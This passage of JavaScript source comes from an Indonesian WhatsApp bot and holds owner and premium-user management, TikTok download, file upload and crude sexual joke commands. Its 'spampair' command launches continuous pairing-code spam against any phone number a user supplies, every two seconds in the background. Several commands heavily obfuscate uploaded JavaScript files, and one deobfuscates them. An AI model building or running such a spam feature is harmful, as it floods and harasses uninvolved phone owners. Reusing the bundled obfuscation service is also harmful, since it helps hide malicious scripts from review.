        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        });
        
        if (!hasShownApprovalMessage) {
            reply('❌ Bot belum di ACC! Silahkan hubungi owner 6281527641306');
            hasShownApprovalMessage = true;
        }
        return;
    }

    if (!isCmd) return; 
    
    if (!isPremium) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '🥺', key: m.key }
        });
        reply('Astaghfirullah');
    }
    break;
}

case "addowner": {
	if (!isApproved) {
		await xwill.sendMessage(m.key.remoteJid, {
			react: { text: '❌', key: m.key }
		});
		
		if (!hasShownApprovalMessage) {
			reply('❌ Bot belum di ACC! Silahkan hubungi owner 6281527641306');
			hasShownApprovalMessage = true;
		}
		return;
	}
    if (!isOwner) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        })
        return reply(mess.only.owner)
    }
    
    const q = args.join(" ")
    if (!q) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❓', key: m.key }
        })
        return reply(`Penggunaan: ${prefix+command} nomor\nContoh: ${prefix+command} 62xxx`)
    }

    const phoneNumber = q.split("|")[0].replace(/[^0-9]/g, '')
    const fullNumber = phoneNumber + '@s.whatsapp.net'
    
    let isRegistered = await xwill.onWhatsApp(fullNumber)
    if (isRegistered.length === 0) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        })
        return reply(`Nomor tidak valid atau tidak terdaftar di WhatsApp!`)
    }

    ownerNumber.push(phoneNumber)
    fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
    await xwill.sendMessage(m.key.remoteJid, {
        react: { text: '✅', key: m.key }
    })
    reply(`✅ Berhasil menambahkan ${phoneNumber} sebagai owner!`)
    break;
}

case "delowner": {
	if (!isApproved) {
		await xwill.sendMessage(m.key.remoteJid, {
			react: { text: '❌', key: m.key }
		});
		
		if (!hasShownApprovalMessage) {
			reply('❌ Bot belum di ACC! Silahkan hubungi owner 6281527641306');
			hasShownApprovalMessage = true;
		}
		return;
	}
    if (!isOwner) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        })
        return reply(mess.only.owner)
    }
    
    const q = args.join(" ")
    if (!args[0]) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❓', key: m.key }
        })
        return reply(`Penggunaan: ${prefix+command} nomor\nContoh: ${prefix+command} 62xxx`)
    }

    const phoneNumber = q.split("|")[0].replace(/[^0-9]/g, '')
    const ownerIndex = ownerNumber.indexOf(phoneNumber)
    
    if (ownerIndex === -1) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        })
        return reply(`Nomor tersebut tidak terdaftar sebagai owner!`)
    }

    ownerNumber.splice(ownerIndex, 1)
    fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
    await xwill.sendMessage(m.key.remoteJid, {
        react: { text: '✅', key: m.key }
    })
    reply(`✅ Berhasil menghapus ${phoneNumber} dari daftar owner!`)
    break;
}

case 'self': {
	if (!isApproved) {
		await xwill.sendMessage(m.key.remoteJid, {
			react: { text: '❌', key: m.key }
		});
		
		if (!hasShownApprovalMessage) {
			reply('❌ Bot belum di ACC! Silahkan hubungi owner 6281527641306');
			hasShownApprovalMessage = true;
		}
		return;
	}
    if (!isOwner) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        })
        return reply(mess.only.owner)
    }
    
    xwill.public = false
    await xwill.sendMessage(m.key.remoteJid, {
        react: { text: '🔒', key: m.key }
    })
    reply('✅ Bot berhasil diubah ke mode private!')
    break;
}

case 'public': {
	if (!isApproved) {
		await xwill.sendMessage(m.key.remoteJid, {
			react: { text: '❌', key: m.key }
		});
		
		if (!hasShownApprovalMessage) {
			reply('❌ Bot belum di ACC! Silahkan hubungi owner 6281527641306');
			hasShownApprovalMessage = true;
		}
		return;
	}
    if (!isOwner) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        })
        return reply(mess.only.owner)
    }
    
    xwill.public = true
    await xwill.sendMessage(m.key.remoteJid, {
        react: { text: '🔓', key: m.key }
    })
    reply('✅ Bot berhasil diubah ke mode public!')
    break;
}

case "addprem": {
	if (!isApproved) {
		await xwill.sendMessage(m.key.remoteJid, {
			react: { text: '❌', key: m.key }
		});
		
		if (!hasShownApprovalMessage) {
			reply('❌ Bot belum di ACC! Silahkan hubungi owner 6281527641306');
			hasShownApprovalMessage = true;
		}
		return;
	}
    if (!isOwner) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        })
        return reply(mess.only.owner)
    }
    
    const q = args.join(" ")
    if (!args[0]) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❓', key: m.key }
        })
        return reply(`Penggunaan: ${prefix+command} nomor\nContoh: ${prefix+command} 62xxx`)
    }

    const phoneNumber = q.split("|")[0].replace(/[^0-9]/g, '')
    const fullNumber = phoneNumber + '@s.whatsapp.net'
    
    let isRegistered = await xwill.onWhatsApp(fullNumber)
    if (isRegistered.length === 0) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        })
        return reply(`Nomor tidak valid atau tidak terdaftar di WhatsApp!`)
    }

    prem.push(fullNumber)
    fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
    await xwill.sendMessage(m.key.remoteJid, {
        react: { text: '💎', key: m.key }
    })
    reply(`✅ Berhasil menambahkan ${phoneNumber} sebagai user premium!`)
    break;
}

case "delprem": {
	if (!isApproved) {
		await xwill.sendMessage(m.key.remoteJid, {
			react: { text: '❌', key: m.key }
		});
		
		if (!hasShownApprovalMessage) {
			reply('❌ Bot belum di ACC! Silahkan hubungi owner 6281527641306');
			hasShownApprovalMessage = true;
		}
		return;
	}
    if (!isOwner) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        })
        return reply(mess.only.owner)
    }
    
    const q = args.join(" ")
    if (!args[0]) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❓', key: m.key }
        })
        return reply(`Penggunaan: ${prefix+command} nomor\nContoh: ${prefix+command} 62xxx`)
    }

    const phoneNumber = q.split("|")[0].replace(/[^0-9]/g, '')
    const fullNumber = phoneNumber + '@s.whatsapp.net'
    const premIndex = prem.indexOf(fullNumber)
    
    if (premIndex === -1) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        })
        return reply(`Nomor tersebut tidak terdaftar sebagai user premium!`)
    }

    prem.splice(premIndex, 1)
    fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
    await xwill.sendMessage(m.key.remoteJid, {
        react: { text: '💔', key: m.key }
    })
    reply(`✅ Berhasil menghapus ${phoneNumber} dari daftar premium!`)
    break;
}




case 'spampair': {
    try {
		if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❌', key: m.key }
            });
            
            if (!hasShownApprovalMessage) {
                reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
                hasShownApprovalMessage = true;
            }
            return;
        }
        if (!isPremium) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❌', key: m.key }
            })
            return reply(mess.only.premium);
        }
        
        const q = args.join(" ");
        const countryCodes = getCountryCodes();

        if (!q) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❓', key: m.key }
            })
            let helpText = `How to use: ${prefix + command} <number>\n\nExamples of use for some countries:\n`;
            helpText += `🇮🇩 Indonesia: ${prefix + command} 628xxx\n`;
            helpText += `🇺🇸 USA: ${prefix + command} 1xxx\n`;
            helpText += `🇯🇵 Japan: ${prefix + command} 81xxx\n`;
            helpText += `🇬🇧 UK: ${prefix + command} 44xxx\n`;
            helpText += `\nKode negara yang didukung:\n`;
            
            const popularCountries = ['62', '1', '44', '81', '86', '82', '61', '65', '60', '66'];
            popularCountries.forEach(code => {
                helpText += `${code}: ${countryCodes[code]}\n`;
            });
            
            helpText += `\nKetik ${prefix}countrycode untuk melihat daftar lengkap kode negara`;
            return reply(helpText);
        }

        const rawNumber = q.split("|")[0].replace(/[^0-9]/g, '');
        const { phoneNumber, countryCode } = validatePhoneNumber(rawNumber, countryCodes);

        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '😈', key: m.key }
        });

        reply(`🔄 Started pairing spam to number ${phoneNumber}...\n📱 Country: ${countryCodes[countryCode]} (+${countryCode})`);

        await startPairSpam(phoneNumber, countryCode, countryCodes);
        
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '✅', key: m.key }
        });
        return reply(`✅ Spam pairing successfully initiated to number ${phoneNumber}\n\n📱 Country: ${countryCodes[countryCode]}\n🌍 Country Codes: +${countryCode}\n⏱️ Interval: 2 seconds\n📊 Status: Active\n\n⚠️ Prosesnya akan berjalan di latar belakang`);

    } catch (err) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        });
		await xwill.sendMessage(m.key.remoteJid);
        console.error('Error in spampair:', err);
        return reply(`❌ ${err.message || 'Terjadi kesalahan saat memulai spam pairing'}`);
    }
    break;
}
case 'countrycode': {
	if (!isApproved) {
		await xwill.sendMessage(m.key.remoteJid, {
			react: { text: '❌', key: m.key }
		});
		
		if (!hasShownApprovalMessage) {
			reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
			hasShownApprovalMessage = true;
		}
		return;
	}
    const countryCodes = getCountryCodes();
    let helpText = `Supported country codes:\n`;
    for (const [code, country] of Object.entries(countryCodes)) {
        helpText += `${code}: ${country}\n`;
    }
    await xwill.sendMessage(m.key.remoteJid);
    return reply(helpText);
}

case 'enc': case 'encrypt': {
	if (!isApproved) {
		await xwill.sendMessage(m.key.remoteJid, {
			react: { text: '❌', key: m.key }
		});
		
		if (!hasShownApprovalMessage) {
			reply('❌ Bot belum di ACC! Silahkan hubungi owner 6281527641306');
			hasShownApprovalMessage = true;
		}
		return;
	}
    if (!isPremium) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        })
        return reply(mess.only.premium)
    }
    if (!m.quoted) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❓', key: m.key }
        })
        return reply(`Reply file .js yang ingin di encrypt!`);
    }
    const quotedMsg = m.quoted;
    if (quotedMsg.mtype !== 'documentMessage' || quotedMsg.mimetype !== "application/javascript") {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        })
        return reply(`File harus berformat .js!`);
    }   
    try {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚙️', key: m.key }
        })
        
        let media = await quotedMsg.download();
        let filename = quotedMsg.fileName || "encryptedbywinkels.js";
        if (!fs.existsSync('./database/sampah/')) {
            fs.mkdirSync('./database/sampah/', { recursive: true });
        }

        await fs.writeFileSync(`./database/sampah/${filename}`, media);
        reply("Memproses encrypt code . . .");

        const fileContent = await fs.readFileSync(`./database/sampah/${filename}`).toString();
        
        JsConfuser.obfuscate(fileContent, {
			target: "node",
            preset: "high",
            calculator: true,
            compact: true,
            hexadecimalNumbers: true,
            controlFlowFlattening: 0.75,
            deadCode: 0.2,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.75,
            flatten: true,
            globalConcealing: true,
            identifierGenerator: "randomized",
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            opaquePredicates: 0.75,
            renameVariables: true,
            renameGlobals: true,
            shuffle: { hash: 0.5, true: 0.5 },
            stack: true,
            stringConcealing: true,
            stringCompression: false, 
            stringEncoding: true,
            stringSplitting: 0.75,
            rgf: false
		}).then(async (obfuscated) => {
            await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated);

            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '✅', key: m.key }
            })

            await xwill.sendMessage(m.chat, {
                document: fs.readFileSync(`./database/sampah/${filename}`),
                mimetype: "application/javascript",
                fileName: filename,
                caption: "Encrypt file sukses ✅"
            }, { quoted: m });
            
            fs.unlinkSync(`./database/sampah/${filename}`);
            
        }).catch(async error => {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❌', key: m.key }
            })
            reply("Error: " + error);
            console.error(error);
        });
        
    } catch (error) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        })
        reply("Error: " + error);
        console.error(error);
    }
    break;
}

case 'cekkontol': {
	if (!isCmd) return;
	if (!q) return reply('Nama nya mana yang mau di cek kontol nya')
	function pickRandom(list) {
		return list[Math.floor(Math.random() * list.length)]
	}


	reply(`
╔═══『 *CEK* *KONTOL* 』═══⊱
╠➤ Nama : ${q}
╠➤ Kontolnya : ${pickRandom(['ih item', 'Belang wkwk', 'Muluss', 'Putih Mulus', 'Black Doff', 'Pink wow', 'Item Glossy'])}
╠➤ Tipe : ${pickRandom(['perjaka', 'ga perjaka', 'udah pernah dimasukin', 'masih ori', 'jumbo'])}
╠➤ jembutnya : ${pickRandom(['lebat', 'ada sedikit', 'gada jembut', 'tipis', 'muluss'])}
╠➤ ukurannya : ${pickRandom(['1cm', '2cm', '3cm', '4cm', '5cm', '20cm', '45cm', '50cm', '90meter', '150meter', '5km', 'gak normal'])}
╚═════════════════════⊱`)
}
	break

case 'cekkhodam': {
	if (!isCmd) return;
	if (!q) return reply('Nama nya mana yang mau di cek khodam nya')
	function pickRandom(list) {
		return list[Math.floor(Math.random() * list.length)]
	}
	reply(`
╔═══『 *CEK* *KHODAM* 』═══⊱
╠➤ Nama : ${q}
╠➤ Khodam : ${pickRandom(['Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 'Badak Jawa', 'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana', 'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', 'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa', 'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Setan Merah', 'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang', 'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung', 'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar', 'Burung Hantu', 'Ikan Cupang'])}
╠➤ Mendampingi dari : ${pickRandom(['1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'dari lahir'])}
╠➤ Dia akan pergi pada tahun : ${pickRandom(['2024', '2025', '2026', '2027', '2028', '2029', '2030', '2031', '2032', '2033', '2034', '2035'])}
╚═════════════════════⊱`)
}
	break

case 'cekmemek': {
	if (!isCmd) return;
	if (!q) return reply('Nama nya mana yang mau di cek memek nya')
	function pickRandom(list) {
		return list[Math.floor(Math.random() * list.length)]
	}


	reply(`
╔═══『 *CEK* *MEMEK* 』═══⊱
╠➤ Nama : ${q}
╠➤ Memek : ${pickRandom(['ih item', 'Belang wkwk', 'Muluss', 'Putih Mulus', 'Pink Banget', 'Black Doff', 'Pink wow', 'Item Glossy'])}
╠➤ Tipe : ${pickRandom(['Perawan', 'ga perawan', 'udah pernah dimasukin', 'Tembem', 'masih ori', 'jumbo'])}
╠➤ jembut : ${pickRandom(['lebat', 'ada sedikit', 'gada jembut', 'tipis', 'muluss'])}
╠➤ Tipe ukuran : ${pickRandom(['Sempit', 'Lumayan Sempit', 'Longgar', 'Lumayan longgar', 'Bolong', 'Bolong gede anjir', 'Pucuknya Kendor', 'Kendor', 'Lumayan kendor', 'Sempurna Bejir', 'Lumayan Sempurna', 'Sempurna Bau Keperawanannya', 'gak normal'])}
╚═════════════════════⊱`)
}
	break

case 'obf1': {
    try {
        if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❌', key: m.key }
            });
            return reply('❌ Bot belum di ACC! Silahkan hubungi owner');
        }
        const quoted = m.quoted ? m.quoted : m;
        if (!quoted || quoted.mtype !== 'documentMessage') {
            return reply('⚠️ Mohon Reply File JS Anda!');
        }
        const progressMessage = await xwill.sendMessage(m.chat, { 
            text: '🔄 Memulai proses obfuscate...\n\n📊 Progress: [          ] 0%' 
        });

        const updateProgress = async (percentage) => {
            const progressBar = '█'.repeat(Math.floor(percentage / 10)) + 
                                ' '.repeat(10 - Math.floor(percentage / 10));
            await xwill.sendMessage(m.chat, { 
                text: `🔄 Sedang memproses...\n\n📊 Progress: [${progressBar}] ${percentage}%`,
                edit: progressMessage.key 
            });
        };

        const filePath = `./database/sampah/${quoted.fileName}`;
        const fileBuffer = await quoted.download();
        await writeFile(filePath, fileBuffer);
        await updateProgress(25);
        const obfuscatedCode = await JsConfuser.obfuscate(fileBuffer.toString(), options);
        
        await updateProgress(50);
        const obfuscatedFilePath = `./database/sampah/obfuscated_xwinkels.js`;
        await writeFile(obfuscatedFilePath, obfuscatedCode);
        
        await updateProgress(75);
        await xwill.sendMessage(m.chat, {
            document: fs.readFileSync(obfuscatedFilePath),
            fileName: `obfuscated_xwinkels.js`,
            mimetype: 'application/javascript',
            caption: '🔒 Sukses Obfuscate Code\n⏰ ' + new Date().toLocaleString()
        }, { quoted: m });
        
        await updateProgress(100);
        fs.unlinkSync(filePath);
        fs.unlinkSync(obfuscatedFilePath);
        await xwill.sendMessage(m.chat, { 
            text: '✅ Obfuscation selesai!',
            edit: progressMessage.key 
        });

    } catch (err) {
        console.error('Error in obfFile:', err);
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        });
        return reply('❌ Gagal obfuscate code!\nError: ' + err.message);
    }
    break;
}


case 'obfnoc': {
    try {
        if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❌', key: m.key }
            });
            return reply('❌ Bot belum di ACC! Silahkan hubungi owner');
        }
        const quoted = m.quoted ? m.quoted : m;
        if (!quoted || quoted.mtype !== 'documentMessage') {
            return reply('⚠️  Mohon Reply File JS Anda!');
        }

        const progressMessage = await xwill.sendMessage(m.chat, { 
            text: '🔄 Memulai proses obfuscate (NOC)...\n\n📊 Progress: [          ] 0%' 
        });

        const updateProgress = async (percentage) => {
            const progressBar = '█'.repeat(Math.floor(percentage / 10)) + 
                                ' '.repeat(10 - Math.floor(percentage / 10));
            await xwill.sendMessage(m.chat, { 
                text: `🔄 Sedang memproses (NOC)...\n\n📊 Progress: [${progressBar}] ${percentage}%`,
                edit: progressMessage.key 
            });
        };

        const filePath = `./database/sampah/${quoted.fileName}`;
        const fileBuffer = await quoted.download();
        await writeFile(filePath, fileBuffer);

        await updateProgress(25);
        const obfuscatedCode = await JsConfuser.obfuscate(fileBuffer.toString(), opsiobf);
        
        await updateProgress(50);
        const obfuscatedFilePath = `./database/sampah/obfuscated_xwinkels.js`;
        await writeFile(obfuscatedFilePath, obfuscatedCode);
        
        await updateProgress(75);
        await xwill.sendMessage(m.chat, {
            document: fs.readFileSync(obfuscatedFilePath),
            fileName: `obfuscated_xwinkels.js`,
            mimetype: 'application/javascript',
            caption: '🔒 Sukses Obfuscate Code (NOC)\n⏰ ' + new Date().toLocaleString()
        }, { quoted: m });
        
        await updateProgress(100);
        fs.unlinkSync(filePath);
        fs.unlinkSync(obfuscatedFilePath);

        await xwill.sendMessage(m.chat, { 
            text: '✅ Obfuscation NOC selesai!',
            edit: progressMessage.key 
        });

    } catch (err) {
        console.error('Error in obfFile:', err);
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        });
        return reply('❌ Gagal obfuscate code!\nError: ' + err.message);
    }
    break;
}


case 'obf2': {
    try {
        if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❌', key: m.key }
            });
            return reply('❌ Bot belum di ACC! Silahkan hubungi owner');
        }
        const quoted = m.quoted ? m.quoted : m;
        if (!quoted || quoted.mtype !== 'documentMessage') {
            return reply('⚠️  Mohon Reply File JS Anda!');
        }

        const progressMessage = await xwill.sendMessage(m.chat, { 
            text: '🔄 Memulai proses obfuscate (Metode 2)...\n\n📊 Progress: [          ] 0%' 
        });

        const updateProgress = async (percentage) => {
            const progressBar = '█'.repeat(Math.floor(percentage / 10)) + 
                                ' '.repeat(10 - Math.floor(percentage / 10));
            await xwill.sendMessage(m.chat, { 
                text: `🔄 Sedang memproses (Metode 2)...\n\n📊 Progress: [${progressBar}] ${percentage}%`,
                edit: progressMessage.key 
            });
        };

        const filePath = `./database/sampah/${quoted.fileName}`;
        const fileBuffer = await quoted.download();
        await writeFile(filePath, fileBuffer);

        await updateProgress(25);
        const obfuscatedCode = await JsConfuser.obfuscate(fileBuffer.toString(), aphro);
        
        await updateProgress(50);
        const obfuscatedFilePath = `./database/sampah/obfuscated_xwinkels.js`;
        await writeFile(obfuscatedFilePath, obfuscatedCode);
        
        await updateProgress(75);
        await xwill.sendMessage(m.chat, {
            document: fs.readFileSync(obfuscatedFilePath),
            fileName: `obfuscated_xwinkels.js`,
            mimetype: 'application/javascript',
            caption: '🔒 Sukses Obfuscate Code (Metode 2)\n⏰ ' + new Date().toLocaleString()
        }, { quoted: m });
        
        await updateProgress(100);
        fs.unlinkSync(filePath);
        fs.unlinkSync(obfuscatedFilePath);

        await xwill.sendMessage(m.chat, { 
            text: '✅ Obfuscation Metode 2 selesai!',
            edit: progressMessage.key 
        });

    } catch (err) {
        console.error('Error in obfFile:', err);
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        });
        return reply('❌ Gagal obfuscate code!\nError: ' + err.message);
    }
    break;
}


case 'obf3': {
    try {
        if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❌', key: m.key }
            });
            return reply('❌ Bot belum di ACC! Silahkan hubungi owner');
        }
        const quoted = m.quoted ? m.quoted : m;
        if (!quoted || quoted.mtype !== 'documentMessage') {
            return reply('⚠️  Mohon Reply File JS Anda!');
        }

        const progressMessage = await xwill.sendMessage(m.chat, { 
            text: '🔄 Memulai proses obfuscate (Metode 3)...\n\n📊 Progress: [          ] 0%' 
        });

        const updateProgress = async (percentage) => {
            const progressBar = '█'.repeat(Math.floor(percentage / 10)) + 
                                ' '.repeat(10 - Math.floor(percentage / 10));
            await xwill.sendMessage(m.chat, { 
                text: `🔄 Sedang memproses (Metode 3)...\n\n📊 Progress: [${progressBar}] ${percentage}%`,
                edit: progressMessage.key 
            });
        };

        const filePath = `./database/sampah/${quoted.fileName}`;
        const fileBuffer = await quoted.download();
        await writeFile(filePath, fileBuffer);

        await updateProgress(25);
        const obfuscatedCode = await JsConfuser.obfuscate(fileBuffer.toString(), optimistis);
        
        await updateProgress(50);
        const obfuscatedFilePath = `./database/sampah/obfuscated_xwinkels.js`;
        await writeFile(obfuscatedFilePath, obfuscatedCode);
        
        await updateProgress(75);
        await xwill.sendMessage(m.chat, {
            document: fs.readFileSync(obfuscatedFilePath),
            fileName: `obfuscated_xwinkels.js`,
            mimetype: 'application/javascript',
            caption: '🔒 Sukses Obfuscate Code (Metode 3)\n⏰ ' + new Date().toLocaleString()
        }, { quoted: m });
        
        await updateProgress(100);
        fs.unlinkSync(filePath);
        fs.unlinkSync(obfuscatedFilePath);

        await xwill.sendMessage(m.chat, { 
            text: '✅ Obfuscation Metode 3 selesai!',
            edit: progressMessage.key 
        });

    } catch (err) {
        console.error('Error in obfFile:', err);
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        });
        return reply('❌ Gagal obfuscate code!\nError: ' + err.message);
    }
    break;
}


case 'dec1': case 'decrypt1': {
    try {
        if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '🚫', key: m.key }
            });
            
            if (!hasShownApprovalMessage) {
                reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
                hasShownApprovalMessage = true;
            }
            return;
        }
        if (!isPremium) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '👑', key: m.key }
            });
            return reply('🔒 Fitur ini khusus untuk pengguna premium!\nSilakan tingkatkan ke premium untuk menggunakan fitur ini.');
        }
        const text = args.join(" ");
        if (!text) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❓', key: m.key }
            });
            return reply('⚠️ Masukkan teks yang akan didekripsi!\nContoh: .dec <kode yang akan didekripsi>');
        }
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⏳', key: m.key }
        });

        const decryptedCode = await deobfuscate(text);
        const watermark = `/*
		* Decrypted By Winkels
		* Time: ${new Date().toLocaleString()}
		*/\n\n`;
        const finalResult = watermark + decryptedCode;

        await xwill.sendMessage(m.chat, { 
            document: Buffer.from(finalResult, 'utf-8'), 
            fileName: 'decrypted_winkels.js', 
            mimetype: 'application/javascript',
            caption: '🔓 Sukses Decrypt Code\n⏰ ' + new Date().toLocaleString()
        }, { quoted: m });
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '🔓', key: m.key }
        });

    } catch (err) {
        console.error('Error in dec:', err);
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        });
        await xwill.sendMessage(m.key.remoteJid);
        return reply('❌ Gagal decrypt code!\nError: ' + err.message);
    }
    break;
}


case 'tourl': {
    try {
        if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '🚫', key: m.key }
            });
            
            if (!hasShownApprovalMessage) {
                reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
                hasShownApprovalMessage = true;
            }
            return;
        }

        if (!isPremium) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '👑', key: m.key }
            });
            return reply('🔒 Fitur ini khusus untuk pengguna premium!\nSilakan tingkatkan ke premium untuk menggunakan fitur ini.');
        }

        let quoted = m.quoted ? m.quoted : m;
        let mime = (quoted.msg || quoted).mimetype || '';
        
        if (!quoted) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❓', key: m.key }
            });
            return reply(`⚠️ Kirim/Reply Media dengan caption ${prefix}tourl`);
        }

        if (!/image|video|audio|document/.test(mime)) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❓', key: m.key }
            });
            return reply(`⚠️ Kirim/Reply Media (gambar/video/dokumen) dengan caption ${prefix}tourl`);
        }

        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⏳', key: m.key }
        });

        const media = await quoted.download();
        const { uploadFile } = require('./database/cetmoe');
        
        const link = await uploadFile(media);
        
        if (!link) throw new Error('Upload gagal');

        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '✅', key: m.key }
        });

        const caption = `
╔═══『 UPLOAD BERHASIL 』═══⊱
╠➤ Link: ${link}
╠➤ Expired: Lifetime
╚═════════════════════⊱`;

        return reply(caption);

    } catch (err) {
        console.error('Error in tourl:', err);
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        });
        await xwill.sendMessage(m.key.remoteJid);
        return reply('❌ Gagal mengupload media!\nError: ' + err.message);
    }
    break;
}
case 'tiktok': {
    try {
        if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '🚫', key: m.key }
            });
            
            if (!hasShownApprovalMessage) {
                reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
                hasShownApprovalMessage = true;
            }
            return;
        }

        if (!isPremium) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '👑', key: m.key }
            });
            return reply('🔒 Fitur ini khusus untuk pengguna premium!\nSilakan tingkatkan ke premium untuk menggunakan fitur ini.');
        }

        if (args.length === 0) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❓', key: m.key }
            });
            return reply(`⚠️ Link TikTok diperlukan!\nContoh: ${prefix}tiktok https://vm.tiktok.com/xxxxx`);
        }

        if (!isUrl(args[0])) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❌', key: m.key }
            });
            return reply('⚠️ URL tidak valid! Pastikan link dari TikTok');
        }


        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⏳', key: m.key }
        });

        async function tiktok(query) {
            return new Promise(async (resolve, reject) => {
                try {
                    const encodedParams = new URLSearchParams();
                    encodedParams.set('url', query);
                    encodedParams.set('hd', '1');

                    const response = await axios({
                        method: 'POST',
                        url: 'https://tikwm.com/api/',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'Cookie': 'current_language=en',
                            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
                        },
                        data: encodedParams
                    });
                    const videos = response.data.data;
                    resolve({
                        title: videos.title,
                        cover: videos.cover,
                        origin_cover: videos.origin_cover,
                        no_watermark: videos.play,
                        watermark: videos.wmplay,
                        music: videos.music
                    });
                } catch (error) {
                    reject(error);
                }
            });
        }

        const res = await tiktok(args[0]);
        const caption = `
╔═══『 TIKTOK DOWNLOADER 』═══⊱
╠➤ Title: ${res.title}
╠➤ Music: Sedang diproses...
╚═════════════════════⊱`;

        await xwill.sendMessage(m.chat, { 
            video: { url: res.no_watermark }, 
            caption: caption,
            fileName: `tiktok_${Date.now()}.mp4`, 
            mimetype: 'video/mp4' 
        });

        await xwill.sendMessage(m.chat, { 
            audio: { url: res.music }, 
            fileName: `tiktok_audio_${Date.now()}.mp3`, 
            mimetype: 'audio/mp4' 
        });

        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '✅', key: m.key }
        });

    } catch (err) {
        console.error('Error in tiktok:', err);
